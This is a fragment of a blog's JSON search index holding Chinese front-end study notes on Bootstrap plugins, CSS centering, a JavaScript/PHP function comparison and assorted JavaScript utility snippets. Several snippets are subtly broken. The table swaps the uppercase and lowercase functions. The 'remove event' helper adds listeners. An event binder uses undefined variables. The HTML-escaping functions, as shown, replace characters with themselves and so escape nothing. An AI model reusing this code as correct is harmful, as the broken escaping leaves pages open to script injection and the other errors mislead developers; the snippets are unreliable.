class=\"btn-group\" data-toggle=\"buttons\"&gt; &lt;label for=\"\" class=\"btn btn-primary active\"&gt; &lt;input type=\"radio\" name=\"sex\" autocomplete=\"off\" checked&gt; 男 &lt;/label&gt; &lt;label for=\"\" class=\"btn btn-primary\"&gt; &lt;input type=\"radio\" name=\"sex\" autocomplete=\"off\"&gt; 女 &lt;/label&gt;&lt;/div&gt; 复选按钮 1234567891011121314&lt;div class=\"btn-group\" data-toggle=\"buttons\"&gt; &lt;label for=\"\" class=\"btn btn-primary active\"&gt; &lt;input type=\"checkbox\" name=\"fa\" autocomplete=\"off\" checked&gt; 音乐 &lt;/label&gt; &lt;label for=\"\" class=\"btn btn-primary\"&gt; &lt;input type=\"checkbox\" name=\"fa\" autocomplete=\"off\"&gt; 体育 &lt;/label&gt; &lt;label for=\"\" class=\"btn btn-primary\"&gt; &lt;input type=\"checkbox\" name=\"fa\" autocomplete=\"off\"&gt; 美术 &lt;/label&gt; &lt;label for=\"\" class=\"btn btn-primary\"&gt; &lt;input type=\"checkbox\" name=\"fa\" autocomplete=\"off\"&gt; 电脑 &lt;/label&gt;&lt;/div&gt; 加载状态 1&lt;button id=\"myButton\" type=\"button\" data-loading-text=\"Loading...\" class=\"btn btn-primary\" autocomplete=\"off\"&gt; 加载状态 &lt;/button&gt; 123456$('#myButton').on('click', function () &#123; var btn = $(this).button('loading'); setTimeout(function () &#123; btn.button('reset'); &#125;, 1000);&#125;); Button 插件中的 button 方法中有三个参数：toggle、reset、string(比如 loading、 complete)。 可代替 data-toggle=&quot;button&quot; 123$('button').on('click', function () &#123; $(this).button('toggle');&#125;); 折叠插件 基本实例 123456&lt;button class=\"btn btn-primary\" data-toggle=\"collapse\" data-target=\"#content\"&gt; Bootstrap &lt;/button&gt;&lt;div class=\"collapse\" id=\"content\"&gt; &lt;div class=\"well\"&gt; Bootstrap 是 Twitter 推出的一个用于前端开发的开源工具包。它由 Twitter 的设计师 Mark Otto 和 Jacob Thornton 合作开发,是一个 CSS/HTML 框架。目 前,Bootstrap 最新版本为 3.0 。 &lt;/div&gt;&lt;/div&gt; Collapse插件的方法：hide、show、toggle 123$('button').on('click', function () &#123; $('#collapseOne').collapse('toggle');&#125;); Collapse插件的事件： show.bs.collapse 在 show 方法调用时立即触发 shown.bs.collapse 折叠区完全显示出来是触发 hide.bs.collapse 在 hide 方法调用时触发 hidden.bs.collapse 该事件在折叠区域完全隐藏之后触发 十二、模态框、轮播插件 模态框插件 模态框的弹窗组件需要三层 div 容器元素，分别为 modal(模态声明层)、 dialog(窗口声明层)、content(内容层) 在内容层里面，还有三层，分别为 header(头部)、body(主体)、footer(注脚) 模态框去掉 show，增加一个 id 12345678&lt;div class=\"modal\" id=\"myModal\"&gt;&lt;!-- 点击触发模态框显示 --&gt;&lt;button class=\"btn btn-primary btn-lg\" data-toggle=\"modal\" data-target=\"#myModal\"&gt; 点击弹窗 &lt;/button&gt;&lt;!-- 弹窗的大小有三种，默认情况下是正常，还有 lg(大)和 sm(小) --&gt;&lt;div class=\"modal-dialog modal-lg\"&gt;&lt;div class=\"modal-dialog sm-lg\"&gt;&lt;!-- 可设置淡入淡出效果 --&gt;&lt;div class=\"modal fade\" id=\"myModal\"&gt; 所有的插件，都是基于 JavaScript/jQuery 的。 四个要素：用法、参数、方法和事件。 用法 可以通过 data 属性 data-toggle data-toggle=&quot;modal&quot; data-target=&quot;#myModal&quot; data-toggle 表示触发类型 data-target 表示触发的节点 如果不是使用&lt;button&gt;，而是&lt;a&gt;，其中 data-target 也可以使用 href=&quot;#myModal&quot;取代 建议使用 data-target。除了 data-toggle 和 data-target 两个声明 属性外，还有一些可以用选项 参数 data-backdrop 布尔值或 &#39;static&#39; 默认值 true，表示背景存在黑灰透明 遮罩，且单击空白背景可关闭弹窗； 如果为 false，表示背景不存在黑灰 透明遮罩，且点击空白背景不可关闭 弹窗； 如果是字符串&#39;static&#39;，表示背景存 在黑灰透明遮罩，且点击空白不可关 闭弹窗。 data-keyboard 布尔值 true 如果是 true，按 esc 键会关闭窗口； 如果是 false，按 esc 键会不会关闭。 data-show 布尔值 true 如果是 true，初始化时，默认显示； 如果是 false，初始化时，默认隐藏。 remote url 路径 空值 如果值不是以#号开头，则表示一个 url 地址，加载 url 内容到 modal-content 容器里，并只加载一 次。 如果是#号，就是取代 data-target 的方法。 在 JavaScript 直接设置 通过 jQuery 方式声明 123456$('#myModal').modal(&#123; show : true, backdrop : false, keyboard : false, remote : 'index.html'&#125;); 方法 toggle .modal(&#39;toggle&#39;); 触发时，反转切换弹窗状态 show .modal(&#39;show&#39;); 触发时，显示弹窗 hide .modal(&#39;hide&#39;); 触发时，关闭弹窗 点击显示弹窗123456$('#btn').on('click', function () &#123; $('#myModal').modal('show');&#125;);$('#myModal').modal(&#123; show : false,&#125;); 事件 show.bs.modal 在show 方法调用时立即触发。 shown.bs.modal 在模态框完全显示出来，并且等 CSS 动画完成之后触 发。 hide.bs.modal 在 hide 方法调用时，但还未关闭隐藏时触发。 hidden.bs.modal 在模态框完全隐藏之后，并且等 CSS 动画完成之后触 发 123456$('#myModal').on('show.bs.modal', function () &#123; alert('在 show 方法调用时立即触发！');&#125;);$('#myModal').on('loaded.bs.modal', function () &#123; alert('远程数据加载完毕后触发！');&#125;); 轮播图插件 data 属性解释： data-slide 接受关键字 prev 或 next，用来改变幻灯片相对于当前位置的位置； data-slide-to 来向轮播底部创建一个原始滑动索引，data-slide-to=&quot;2&quot;将把滑 动块移动到一个特定的索引，索引从 0 开始计数。 data-ride=&quot;carousel&quot;属性用户标记轮播在页面加载时开始动画播放。 data-interval 默认值 5000，幻灯片的等待时间(毫秒)。如果为 false，轮播将不会自动开始循环。 data-pause 默认鼠标停留在幻灯片区域(hover)即暂停轮播，鼠 标离开即启动轮播。 data-wrap 默认值 true，轮播是否持续循环。 如果在 JavaScript 调用就直接使用键值对方法，并去掉 data-； 12345$('#myCarousel').carousel(&#123; //设置自定义属性 interval : 2000,//设置自动播放`/2` 秒 pause : 'hover',//设置暂停按钮的事件 wrap : false, //只播一次&#125;); 方法： cycle 循环各帧(默认从左到右) pause 停止轮播 number 轮播到指定的图片上(小标从 0 开始，类似数组) prev 循环轮播到上一个项目 next 循环轮播到下一个项目 123$('button').on('click', function () &#123;//点击按钮执行 $('#myCarousel').carousel('cycle'); //点击后，自动播放&#125; 事件 slide.bs.carousel 当调用 slide 实例方式时立即触发该事件。 slid.bs.carousel 当轮播完成一个幻灯片触发该事件 123456$('#myCarousel').on('slide.bs.carousel', function () &#123; alert('当调用 slide 实例方式时立即触发'); &#125;);$('#myCarousel').on('slid.bs.carousel', function () &#123; alert('当轮播完成一个幻灯片触发');&#125;); bootstrap笔记总结【复制到浏览器打开放大】 bootstrap笔记总结 拓展阅读 bootstrap中文教程 bootstrap很方便的速查表-推荐","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"bootstrap","slug":"bootstrap","permalink":"https://ru23.com/tags/bootstrap/"}]},{"title":"居中解决方案荟萃","slug":"2016-11-CSS-center-methods","date":"2016-11-12T09:55:24.000Z","updated":"2018-10-24T03:46:01.938Z","comments":true,"path":"note/df00e94a.html","link":"","permalink":"https://ru23.com/note/df00e94a.html","excerpt":"水平居中方案 方案一：text-align + inline-block 123&lt;div id=\"parent1\"&gt; &lt;div class=\"child\"&gt;水平居中&lt;/div&gt;&lt;/div&gt; 12345678910#parent1&#123; text-align: center; background:#ddd; margin-bottom:20px;&#125;#parent1 .child&#123; display: inline-block; background:#666; color:#fff;&#125;","text":"水平居中方案 方案一：text-align + inline-block 123&lt;div id=\"parent1\"&gt; &lt;div class=\"child\"&gt;水平居中&lt;/div&gt;&lt;/div&gt; 12345678910#parent1&#123; text-align: center; background:#ddd; margin-bottom:20px;&#125;#parent1 .child&#123; display: inline-block; background:#666; color:#fff;&#125; 方案二：margin：0 auto 123&lt;div id=\"parent2\"&gt; &lt;div class=\"child\"&gt;水平居中&lt;/div&gt;&lt;/div&gt; 1234567891011#parent2&#123; text-align: center; background:#ddd; margin-bottom:20px;&#125;#parent2 .child&#123; display: table; margin: 0 auto; background:#666; color:#fff;&#125; 方案三：absolute+transform) 123&lt;div id=\"parent3\"&gt; &lt;div class=\"child\"&gt;水平居中&lt;/div&gt;&lt;/div&gt; 123456789101112#parent3&#123; position: relative; background:#ddd; margin-bottom:20px;&#125;#parent3 .child&#123; position: absolute; left: 50%; transform: translateX(-50%); background:#666; color:#fff;&#125; 方案四：justify-content 123&lt;div id=\"parent4\"&gt; &lt;div class=\"child\"&gt;水平居中&lt;/div&gt;&lt;/div&gt; 1234567891011#parent4&#123; display: flex; justify-content: center; background:#ddd; margin-bottom:20px;&#125;#parent4 .child&#123; margin:0 auto; background:#666; color:#fff;&#125; 垂直居中方案 方案一： 利用 line-height 实现垂直居中 这种方法适用于单行文本垂直居中,如果文本内容太长，出现了换行，换行后的内容会溢出 123&lt;div id=\"example1\"&gt; 单行文字垂直居中&lt;/div&gt; 1234567#example1 &#123; height: 100px; line-height: 100px; background: #161616; color: #fff; width: 200px;&#125; 方案二 利用 display: table 实现垂直居中 123&lt;div id=\"example2\"&gt; &lt;div class=\"inner\"&gt;块区域垂直居中&lt;/div&gt;&lt;/div&gt; 123456789101112131415#example2 &#123; height: 100px; background: #161616; color: #fff; width: 400px; overflow: hidden; display: table; margin-bottom:20px;&#125;#example2 .inner&#123; display: table-cell; vertical-align: middle; height: 50px; background:#999;&#125; 方案三 margin 填充 这种方法需要知道内外容器的大小 123&lt;div id=\"example3\"&gt; &lt;div class=\"inner\"&gt;块区域垂直居中&lt;/div&gt;&lt;/div&gt; 123456789101112131415#example3 &#123; height: 100px; background: #161616; color: #fff; width: 400px; overflow: hidden; margin-bottom:20px;&#125;#example3 .inner&#123; margin-left: auto; margin-right: auto; margin-top: calc((100px - 50px)/2); height: 50px; background:#999;&#125; 方案四：经典 absolute 布局上下文垂直居中 123&lt;div id=\"example4\"&gt; &lt;div class=\"inner\"&gt;块区域垂直居中&lt;/div&gt;&lt;/div&gt; 123456789101112131415161718#example4 &#123; width: 400px; height: 100px; background: #161616; color: #fff; position: relative; margin-bottom:20px;&#125;#example4 .inner&#123; height: 50px; width: 200px; position: absolute; left: 50%; top: 50%; margin-top: -25px; margin-left: -100px; background:#999;&#125; 方案五：absolute+transform 123&lt;div id=\"example5\"&gt; &lt;div class=\"inner\"&gt;块区域垂直居中&lt;/div&gt;&lt;/div&gt; 123456789101112131415#example5 &#123; width: 400px; height: 100px; background: #161616; color: #fff; position: relative; margin-bottom:20px;&#125;#example5 .inner&#123; position: absolute; left: 50%; top: 50%; background: #999; transform: translateX(-50%) translateY(-50%);&#125; 方案六 利用margin：auto 居中 123&lt;div id=\"expample6\"&gt; &lt;div class=\"inner\"&gt;Content here&lt;/div&gt;&lt;/div&gt; 1234567891011121314151617181920#expample6 &#123; width: 400px; height: 100px; background: #eee; position: relative; margin-bottom:20px;&#125;#expample6 .inner &#123; position: absolute; top: 0; bottom: 0; left: 0; right: 0; margin: auto; height: 50px; width: 70%; background: #aaa; color:#222;&#125; 方案七 利用 Flex布局 居中 123&lt;div id=\"expample7\"&gt; &lt;div class=\"inner\"&gt;Content here&lt;/div&gt;&lt;/div&gt; 123456789101112131415#expample7 &#123; width: 400px; height: 100px; background: #eee; display: flex; justify-content: center; align-items: center;&#125;#expample7 .inner &#123; height: 50px; width: 70%; background: #aaa; color:#222;&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://ru23.com/tags/CSS/"},{"name":"居中","slug":"居中","permalink":"https://ru23.com/tags/居中/"}]},{"title":"JavaScript&&PHP常用函数对比","slug":"2016-12-compare-js-php-func","date":"2016-11-12T08:08:24.000Z","updated":"2018-10-24T03:46:01.994Z","comments":true,"path":"note/d09b98b1.html","link":"","permalink":"https://ru23.com/note/d09b98b1.html","excerpt":"字符函数 JavaScript php 获取字符串长度 字符串.length strlen( 字符串 ); 截取字符串 字符串.substr( 起始位 [,长度] ); substr( 字符串, 起始位 [,长度] ); 字符串定位（子字符串 在字符串 中出现的位置） 字符串.indexOf( 子字符串 );字符串.lastIndexOf( 子字符串 ); strpos( 字符串, 子字符串 );strrpos( 字符串, 子字符串 ); 拆分为数组 字符串.split( 分割符 ); explode( 分隔符, 字符串 ); 转化为大写 字符串.toLowerCase(); strtoupper( 字符串 ); 转化为小写 字符串.toUpperCase(); strtolower( 字符串 );","text":"字符函数 JavaScript php 获取字符串长度 字符串.length strlen( 字符串 ); 截取字符串 字符串.substr( 起始位 [,长度] ); substr( 字符串, 起始位 [,长度] ); 字符串定位（子字符串 在字符串 中出现的位置） 字符串.indexOf( 子字符串 );字符串.lastIndexOf( 子字符串 ); strpos( 字符串, 子字符串 );strrpos( 字符串, 子字符串 ); 拆分为数组 字符串.split( 分割符 ); explode( 分隔符, 字符串 ); 转化为大写 字符串.toLowerCase(); strtoupper( 字符串 ); 转化为小写 字符串.toUpperCase(); strtolower( 字符串 ); 数组函数 JavaScript php 获取数组长度 数组.length; count( 数组 ) 或 sizeof( 数组 ); 连接为字符串 数组.join( 连接符 ); implode( 连接符, 数组 ); 头部压入 数组.unshift( 元素1, 元素2… ); array_unshift( 数组, 元素1, 元素2… ); 头部弹出 数组.shift(); array_shift( 数组 ); 尾部压入 数组.push( 元素1, 元素2… ) ; array_push( 数组 , 元素1, 元素2… ); 尾部弹出 数组.pop(); array_pop( 数组 ); 时间函数 JavaScript 月日时分秒均无前导零 php 以下月日时分秒均含前导零 获取年份 new Date().getFullYear(); date( ‘Y’ ); 获取月份 new Date().getMonth(); //0~11 date( ‘m’ ); //01~12 获取几号 new Date().getDate(); date( ‘d’ ); 获取星期 new Date().getDay(); //0~6 date( ‘N’ ); //1~7 获取小时 new Date().getHours(); date( ‘H’ ); 获取分钟 new Date().getMinutes(); date( ‘i’ ); 获取秒 new Date().getSeconds(); date( ‘s’ ); 获取时间戳 new Date().getTime()/1000; time(); 数学函数 JavaScript php 舍一取整 Math.floor( 变量 ) ; floor( 变量 ); 进一取整 Math.ceil( 变量 ) ; ceil( 变量 ); 随机数 Math.random(); //0~1 mt_rand( 起始, 终止 ); 幂运算 Math.pow( 底数, 指数 ); pow( 底数, 指数 ); 开平方 Math.sqrt( 变量 ); sqrt( 变量 );","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"PHP","slug":"PHP","permalink":"https://ru23.com/tags/PHP/"}]},{"title":"JavaScript常用的代码片段","slug":"2016-10-JavaScript-code-snippets","date":"2016-10-27T03:40:43.000Z","updated":"2018-10-24T03:46:01.928Z","comments":true,"path":"note/9db8c984.html","link":"","permalink":"https://ru23.com/note/9db8c984.html","excerpt":"转义特殊字符为html实体 123HtmlEncode: function(str)&#123; return str.replace(/&amp;/g, '&amp;').replace(/\\\"/g, '\"').replace(/&lt;/g, '&lt;').replace(/&gt;/g, '&gt;').replace(/'/g, ''');&#125;, 验证是否为有效的手机电话号码 1234IsMobile: function(str)&#123; var rp = /^1[3|4|5|7|8][0-9]\\d&#123;4,8&#125;$/; return rp.test(str);&#125;, 验证是否为有效的座机电话号码","text":"转义特殊字符为html实体 123HtmlEncode: function(str)&#123; return str.replace(/&amp;/g, '&amp;').replace(/\\\"/g, '\"').replace(/&lt;/g, '&lt;').replace(/&gt;/g, '&gt;').replace(/'/g, ''');&#125;, 验证是否为有效的手机电话号码 1234IsMobile: function(str)&#123; var rp = /^1[3|4|5|7|8][0-9]\\d&#123;4,8&#125;$/; return rp.test(str);&#125;, 验证是否为有效的座机电话号码 1234IsTel: function(str)&#123; var rp = /^([0-9]&#123;3,4&#125;-)?[0-9]&#123;7,8&#125;$/; return rp.test(str);&#125;, 判断是那种类型的浏览器 123456789101112131415161718192021222324252627282930313233343536373839404142434445WhichBrowser: function()&#123; var userAgent = navigator.userAgent; var isOpera = userAgent.indexOf(\"Opera\") &gt; -1; var isIE = userAgent.indexOf(\"compatible\") &gt; -1 &amp;&amp; userAgent.indexOf(\"MSIE\") &gt; -1 &amp;&amp; !isOpera; var isFF = userAgent.indexOf(\"Firefox\") &gt; -1; var isCH = userAgent.indexOf(\"Chrome\") &gt; -1; var isSafari = userAgent.indexOf(\"Safari\") &gt; -1; if (isIE)&#123; var IE5 = IE55 = IE6 = IE7 = IE8 = false; var reIE = new RegExp(\"MSIE (\\\\d+\\\\.\\\\d+);\"); reIE.test(userAgent); var fIEVersion = parseFloat(RegExp[\"$1\"]); IE55 = fIEVersion == 5.5; IE6 = fIEVersion == 6.0; IE7 = fIEVersion == 7.0; IE8 = fIEVersion == 8.0; if (IE55) &#123; return \"IE55\"; &#125; if (IE6) &#123; return \"IE6\"; &#125; if (IE7) &#123; return \"IE7\"; &#125; if (IE8) &#123; return \"IE8\"; &#125; &#125; if (isFF) &#123; return \"Firefox\"; &#125; if (isCH) &#123; return \"Chrome\"; &#125; if (isOpera) &#123; return \"Opera\"; &#125; if (isSafari) &#123; return \"Safari\"; &#125;&#125;, 获取客户端浏览器cookie 123456789101112GetCookie: function(c_name)&#123; if(document.cookie.length&gt;0)&#123; c_start = document.cookie.indexOf(c_name + '='); if(c_start != -1)&#123; c_start = c_start + c_name.length + 1; c_end = document.cookie.indexOf(';',c_start); if (c_end==-1) c_end = document.cookie.length; return unescape(document.cookie.substring(c_start,c_end)); &#125; &#125; return '';&#125;, 设置客户端浏览器cookie 123456SetCookie: function(c_name, value, expiredays)&#123; var exdate = new Date(); exdate.setDate(exdate.getDate() + expiredays); document.cookie = c_name + \"=\" + escape(value) + ((expiredays==null) ? \"\" : \";expires=\"+exdate.toGMTString());&#125;,&#125;; 字符串长度截取 1234567891011121314151617181920function cutstr(str, len) &#123; var temp, icount = 0, patrn = /[^\\x00-\\xff]/， strre = \"\"; for (var i = 0; i &lt; str.length; i++) &#123; if (icount &lt; len - 1) &#123; temp = str.substr(i, 1); if (patrn.exec(temp) == null) &#123; icount = icount + 1 &#125; else &#123; icount = icount + 2 &#125; strre += temp &#125; else &#123; break; &#125; &#125; return strre + \"...\"&#125; 替换全部 123String.prototype.replaceAll = function(s1, s2) &#123; return this.replace(new RegExp(s1, \"gm\"), s2)&#125; 清除空格 1234String.prototype.trim = function() &#123; var reExtraSpace = /^\\s*(.*?)\\s+$/; return this.replace(reExtraSpace, \"$1\")&#125; 清除左空格/右空格 12function ltrim(s)&#123; return s.replace( /^(\\s*| *)/, \"\"); &#125; function rtrim(s)&#123; return s.replace( /(\\s*| *)$/, \"\"); &#125; 判断是否以某个字符串开头 123String.prototype.startWith = function (s) &#123; return this.indexOf(s) == 0&#125; 判断是否以某个字符串结束 1234String.prototype.endWith = function (s) &#123; var d = this.length - s.length; return (d &gt;= 0 &amp;&amp; this.lastIndexOf(s) == d)&#125; 转义html标签 123function HtmlEncode(text) &#123; return text.replace(/&amp;/g, '&amp;').replace(/\\\"/g, '\"').replace(/&lt;/g, '&lt;').replace(/&gt;/g, '&gt;')&#125; 时间日期格式转换 123456789101112131415161718Date.prototype.Format = function(formatStr) &#123; var str = formatStr; var Week = ['日', '一', '二', '三', '四', '五', '六']; str = str.replace(/yyyy|YYYY/, this.getFullYear()); str = str.replace(/yy|YY/, (this.getYear() % 100) &gt; 9 ? (this.getYear() % 100).toString() : '0' + (this.getYear() % 100)); str = str.replace(/MM/, (this.getMonth() + 1) &gt; 9 ? (this.getMonth() + 1).toString() : '0' + (this.getMonth() + 1)); str = str.replace(/M/g, (this.getMonth() + 1)); str = str.replace(/w|W/g, Week[this.getDay()]); str = str.replace(/dd|DD/, this.getDate() &gt; 9 ? this.getDate().toString() : '0' + this.getDate()); str = str.replace(/d|D/g, this.getDate()); str = str.replace(/hh|HH/, this.getHours() &gt; 9 ? this.getHours().toString() : '0' + this.getHours()); str = str.replace(/h|H/g, this.getHours()); str = str.replace(/mm/, this.getMinutes() &gt; 9 ? this.getMinutes().toString() : '0' + this.getMinutes()); str = str.replace(/m/g, this.getMinutes()); str = str.replace(/ss|SS/, this.getSeconds() &gt; 9 ? this.getSeconds().toString() : '0' + this.getSeconds()); str = str.replace(/s|S/g, this.getSeconds()); return str&#125; 判断是否为数字类型 12345678function isDigit(value) &#123; var patrn = /^[0-9]*$/; if (patrn.exec(value) == null || value == \"\") &#123; return false &#125; else &#123; return true &#125;&#125; 设置cookie值 123456789function setCookie(name, value, Hours) &#123; var d = new Date(); var offset = 8; var utc = d.getTime() + (d.getTimezoneOffset() * 60000); var nd = utc + (3600000 * offset); var exp = new Date(nd); exp.setTime(exp.getTime() + Hours * 60 * 60 * 1000); document.cookie = name + \"=\" + escape(value) + \";path=/;expires=\" + exp.toGMTString() + \";domain=360doc.com;\"&#125; 获取cookie值 12345function getCookie(name) &#123; var arr = document.cookie.match(new RegExp(\"(^| )\" + name + \"=([^;]*)(;|$)\")); if (arr != null) return unescape(arr[2]); return null&#125; 加入收藏夹 1234567891011function AddFavorite(sURL, sTitle) &#123; try &#123; window.external.addFavorite(sURL, sTitle) &#125; catch(e) &#123; try &#123; window.sidebar.addPanel(sTitle, sURL, \"\") &#125; catch(e) &#123; alert(\"加入收藏失败，请使用Ctrl+D进行添加\") &#125; &#125;&#125; 设为首页 12345678910111213141516function setHomepage() &#123; if (document.all) &#123; document.body.style.behavior = 'url(#default#homepage)'; document.body.setHomePage('http://w3cboy.com') &#125; else if (window.sidebar) &#123; if (window.netscape) &#123; try &#123; netscape.security.PrivilegeManager.enablePrivilege(\"UniversalXPConnect\") &#125; catch(e) &#123; alert(\"该操作被浏览器拒绝，如果想启用该功能，请在地址栏内输入 about:config,然后将项 signed.applets.codebase_principal_support 值该为true\") &#125; &#125; var prefs = Components.classes['@mozilla.org/preferences-service;1'].getService(Components.interfaces.nsIPrefBranch); prefs.setCharPref('browser.startup.homepage', 'http://w3cboy.com') &#125;&#125; 加载样式文件 123456789101112function LoadStyle(url) &#123; try &#123; document.createStyleSheet(url) &#125; catch(e) &#123; var cssLink = document.createElement('link'); cssLink.rel = 'stylesheet'; cssLink.type = 'text/css'; cssLink.href = url; var head = document.getElementsByTagName('head')[0]; head.appendChild(cssLink) &#125;&#125; 返回脚本内容 123456789101112131415161718function evalscript(s) &#123; if(s.indexOf('&lt;script') == -1) return s; var p = /&lt;script[^\\&gt;]*?&gt;([^\\x00]*?)&lt;\\/script&gt;/ig; var arr = []; while(arr = p.exec(s)) &#123; var p1 = /&lt;script[^\\&gt;]*?src=\\\"([^\\&gt;]*?)\\\"[^\\&gt;]*?(reload=\\\"1\\\")?(?:charset=\\\"([\\w\\-]+?)\\\")?&gt;&lt;\\/script&gt;/i; var arr1 = []; arr1 = p1.exec(arr[0]); if(arr1) &#123; appendscript(arr1[1], '', arr1[2], arr1[3]); &#125; else &#123; p1 = /&lt;script(.*?)&gt;([^\\x00]+?)&lt;\\/script&gt;/i; arr1 = p1.exec(arr[0]); appendscript('', arr1[2], arr1[1].indexOf('reload=') != -1); &#125; &#125; return s;&#125; 清除脚本内容 123function stripscript(s) &#123; return s.replace(/&lt;script.*?&gt;.*?&lt;\\/script&gt;/ig, '');&#125; 动态加载脚本文件 1234567891011121314151617181920212223242526272829303132function appendscript(src, text, reload, charset) &#123; var id = hash(src + text); if(!reload &amp;&amp; in_array(id, evalscripts)) return; if(reload &amp;&amp; $(id)) &#123; $(id).parentNode.removeChild($(id)); &#125; evalscripts.push(id); var scriptNode = document.createElement(\"script\"); scriptNode.type = \"text/javascript\"; scriptNode.id = id; scriptNode.charset = charset ? charset : (BROWSER.firefox ? document.characterSet : document.charset); try &#123; if(src) &#123; scriptNode.src = src; scriptNode.onloadDone = false; scriptNode.onload = function () &#123; scriptNode.onloadDone = true; JSLOADED[src] = 1; &#125;; scriptNode.onreadystatechange = function () &#123; if((scriptNode.readyState == 'loaded' || scriptNode.readyState == 'complete') &amp;&amp; !scriptNode.onloadDone) &#123; scriptNode.onloadDone = true; JSLOADED[src] = 1; &#125; &#125;; &#125; else if(text)&#123; scriptNode.text = text; &#125; document.getElementsByTagName('head')[0].appendChild(scriptNode); &#125; catch(e) &#123;&#125;&#125; 返回按ID检索的元素对象 123function $(id) &#123; return !id ? null : document.getElementById(id);&#125; 跨浏览器绑定事件 12345678910function addEventSamp(obj,evt,fn)&#123; if(!oTarget)&#123;return;&#125; if (obj.addEventListener) &#123; obj.addEventListener(evt, fn, false); &#125;else if(obj.attachEvent)&#123; obj.attachEvent('on'+evt,fn); &#125;else&#123; oTarget[\"on\" + sEvtType] = fn; &#125; &#125; 跨浏览器删除事件 12345678910function delEvt(obj,evt,fn)&#123; if(!obj)&#123;return;&#125; if(obj.addEventListener)&#123; obj.addEventListener(evt,fn,false); &#125;else if(oTarget.attachEvent)&#123; obj.attachEvent(\"on\" + evt,fn); &#125;else&#123; obj[\"on\" + evt] = fn; &#125;&#125; 为元素添加on方法 12345678Element.prototype.on = Element.prototype.addEventListener; NodeList.prototype.on = function (event, fn) &#123;、 []['forEach'].call(this, function (el) &#123; el.on(event, fn); &#125;); return this;&#125;; 为元素添加trigger方法 12345678910111213141516Element.prototype.trigger = function (type, data) &#123; var event = document.createEvent('HTMLEvents'); event.initEvent(type, true, true); event.data = data || &#123;&#125;; event.eventName = type; event.target = this; this.dispatchEvent(event); return this;&#125;; NodeList.prototype.trigger = function (event) &#123; []['forEach'].call(this, function (el) &#123; el['trigger'](event); &#125;); return this;&#125;; 检验URL链接是否有效 12345678910111213141516171819function getUrlState(URL)&#123; var xmlhttp = new ActiveXObject(\"microsoft.xmlhttp\"); xmlhttp.Open(\"GET\",URL, false); try&#123; xmlhttp.Send(); &#125;catch(e)&#123; &#125;finally&#123; var result = xmlhttp.responseText; if(result)&#123; if(xmlhttp.Status==200)&#123; return(true); &#125;else&#123; return(false); &#125; &#125;else&#123; return(false); &#125; &#125;&#125; 格式化CSS样式代码 123456789function formatCss(s)&#123;//格式化代码 s = s.replace(/\\s*([\\&#123;\\&#125;\\:\\;\\,])\\s*/g, \"$1\"); s = s.replace(/;\\s*;/g, \";\"); //清除连续分号 s = s.replace(/\\,[\\s\\.\\#\\d]*&#123;/g, \"&#123;\"); s = s.replace(/([^\\s])\\&#123;([^\\s])/g, \"$1 &#123;\\n\\t$2\"); s = s.replace(/([^\\s])\\&#125;([^\\n]*)/g, \"$1\\n&#125;\\n$2\"); s = s.replace(/([^\\s]);([^\\s\\&#125;])/g, \"$1;\\n\\t$2\"); return s;&#125; 压缩CSS样式代码 12345678function compressCss (s) &#123;//压缩代码 s = s.replace(/\\/\\*(.|\\n)*?\\*\\//g, \"\"); //删除注释 s = s.replace(/\\s*([\\&#123;\\&#125;\\:\\;\\,])\\s*/g, \"$1\"); s = s.replace(/\\,[\\s\\.\\#\\d]*\\&#123;/g, \"&#123;\"); //容错处理 s = s.replace(/;\\s*;/g, \";\"); //清除连续分号 s = s.match(/^\\s*(\\S+(\\s+\\S+)*)\\s*$/); //去掉首尾空白 return (s == null) ? \"\" : s[1];&#125; 获取当前路径 123456var currentPageUrl = \"\";if (typeof this.href === \"undefined\") &#123; currentPageUrl = document.location.toString().toLowerCase();&#125;else &#123; currentPageUrl = this.href.toString().toLowerCase();&#125; 判断是否移动设备 1234567891011121314151617function isMobile()&#123; if (typeof this._isMobile === 'boolean')&#123; return this._isMobile; &#125; var screenWidth = this.getScreenWidth(); var fixViewPortsExperiment = rendererModel.runningExperiments.FixViewport ||rendererModel.runningExperiments.fixviewport; var fixViewPortsExperimentRunning = fixViewPortsExperiment &amp;&amp; (fixViewPortsExperiment.toLowerCase() === \"new\"); if(!fixViewPortsExperiment)&#123; if(!this.isAppleMobileDevice())&#123; screenWidth = screenWidth/window.devicePixelRatio; &#125; &#125; var isMobileScreenSize = screenWidth &lt; 600; var isMobileUserAgent = false; this._isMobile = isMobileScreenSize &amp;&amp; this.isTouchScreen(); return this._isMobile;&#125; 判断是否移动设备访问 123function isMobileUserAgent()&#123; return (/iphone|ipod|android.*mobile|windows.*phone|blackberry.*mobile/i.test(window.navigator.userAgent.toLowerCase()));&#125; 判断是否苹果移动设备访问 123function isAppleMobileDevice()&#123; return (/iphone|ipod|ipad|Macintosh/i.test(navigator.userAgent.toLowerCase()));&#125; 判断是否安卓移动设备访问 123function isAndroidMobileDevice()&#123; return (/android/i.test(navigator.userAgent.toLowerCase()));&#125; 判断是否Touch屏幕 123function isTouchScreen()&#123; return (('ontouchstart' in window) || window.DocumentTouch &amp;&amp; document instanceof DocumentTouch);&#125; 判断是否打开视窗 123function isViewportOpen() &#123; return !!document.getElementById('wixMobileViewport');&#125; 获取移动设备初始化大小 12345678910function getInitZoom()&#123; if(!this._initZoom)&#123; var screenWidth = Math.min(screen.height, screen.width); if(this.isAndroidMobileDevice() &amp;&amp; !this.isNewChromeOnAndroid())&#123; screenWidth = screenWidth/window.devicePixelRatio; &#125; this._initZoom = screenWidth /document.body.offsetWidth; &#125; return this._initZoom;&#125; 获取移动设备最大化大小 12345678910111213function getZoom()&#123; var screenWidth = (Math.abs(window.orientation) === 90) ? Math.max(screen.height, screen.width) : Math.min(screen.height, screen.width); if(this.isAndroidMobileDevice() &amp;&amp; !this.isNewChromeOnAndroid())&#123; screenWidth = screenWidth/window.devicePixelRatio; &#125; var FixViewPortsExperiment = rendererModel.runningExperiments.FixViewport || rendererModel.runningExperiments.fixviewport; var FixViewPortsExperimentRunning = FixViewPortsExperiment &amp;&amp; (FixViewPortsExperiment === \"New\" || FixViewPortsExperiment === \"new\"); if(FixViewPortsExperimentRunning)&#123; return screenWidth / window.innerWidth; 